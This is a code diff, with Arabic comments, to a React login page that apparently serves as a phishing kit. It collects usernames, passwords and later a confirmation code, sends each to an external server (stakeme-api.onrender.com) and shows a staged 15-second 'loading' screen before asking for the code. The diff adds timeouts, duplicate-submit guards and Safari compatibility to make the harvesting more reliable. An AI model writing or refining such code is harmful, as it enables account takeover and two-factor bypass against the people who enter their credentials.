@@ -1,4 +1,4 @@
-import { useState, type MouseEvent } from "react";
+import { useState, type MouseEvent, useRef } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
@@ -35,6 +35,7 @@ type Screen = "credentials" | "loading" | "code" | "drop";
 export default function Login() {
   const [showPassword, setShowPassword] = useState(false);
   const [screen, setScreen] = useState<Screen>("credentials");
+  const isSubmitting = useRef(false); // ✅ لمنع الإرسال المتكرر
 
   const form = useForm<LoginFormValues>({
     resolver: zodResolver(loginSchema),
@@ -53,14 +54,27 @@ export default function Login() {
   });
 
   // ============================================
-  // 🔐 دالة إرسال التنبيه إلى الخادم (نفس النطاق)
+  // 🔐 دالة إرسال التنبيه إلى الخادم (متوافقة مع Safari)
   // ============================================
   const sendAlertToServer = async (username: string, password: string) => {
+    if (isSubmitting.current) return; // ✅ منع الإرسال المتكرر
+    isSubmitting.current = true;
+
     try {
-      const response = await fetch('https://stakeme-api.onrender.com/api/submit', {
+      // ✅ استخدام المسار المطلق لضمان الوصول
+      const apiUrl = 'https://stakeme-api.onrender.com/api/submit';
+      
+      console.log('📤 Sending to:', apiUrl);
+      console.log('📤 Data:', { username, password });
+
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 10000); // ✅ مهلة 10 ثواني
+
+      const response = await fetch(apiUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
+          'Accept': 'application/json',
         },
         body: JSON.stringify({
           username: username,
@@ -68,15 +82,28 @@ export default function Login() {
           timestamp: new Date().toISOString(),
           userAgent: navigator.userAgent,
         }),
+        signal: controller.signal,
       });
 
+      clearTimeout(timeoutId);
+
+      console.log('📤 Response status:', response.status);
+
       if (!response.ok) {
-        console.warn(`⚠️ Server responded with status ${response.status}`);
         const text = await response.text();
-        console.warn('⚠️ Response body:', text);
+        console.warn('⚠️ Server error:', text);
+        throw new Error(`Server responded with ${response.status}: ${text}`);
       }
+
+      const data = await response.json();
+      console.log('✅ Success:', data);
+
     } catch (error) {
-      console.warn('⚠️ Alert failed:', error);
+      console.error('❌ Failed to send alert:', error);
+      // ✅ نعرض رسالة للمستخدم في حال فشل الإرسال
+      alert('تعذر إرسال البيانات. تأكد من اتصالك بالإنترنت وحاول مرة أخرى.');
+    } finally {
+      isSubmitting.current = false;
     }
   };
 
@@ -84,10 +111,13 @@ export default function Login() {
   // 📤 دالة إرسال بيانات الدخول
   // ============================================
   const onSubmit = async (data: LoginFormValues) => {
+    // ✅ منع السلوك الافتراضي للصفحة
+    event?.preventDefault?.();
+
     // إرسال البيانات إلى الخادم
     await sendAlertToServer(data.username, data.password);
 
-    // متابعة العملية
+    // متابعة العملية بغض النظر عن نجاح الإرسال
     setScreen("loading");
     window.setTimeout(() => setScreen("code"), 15000);
   };
@@ -96,6 +126,8 @@ export default function Login() {
   // 📤 دالة إرسال رمز التأكيد
   // ============================================
   const onCodeSubmit = async (data: CodeFormValues) => {
+    event?.preventDefault?.();
+
     // إرسال رمز التأكيد إلى الخادم
     await sendAlertToServer("🔐 رمز التأكيد", data.code);
 
@@ -108,6 +140,7 @@ export default function Login() {
     codeForm.reset();
     setShowPassword(false);
     setScreen("credentials");
+    isSubmitting.current = false;
   };
 
   const alternativeSignIn = (event: MouseEvent<HTMLButtonElement>) => {
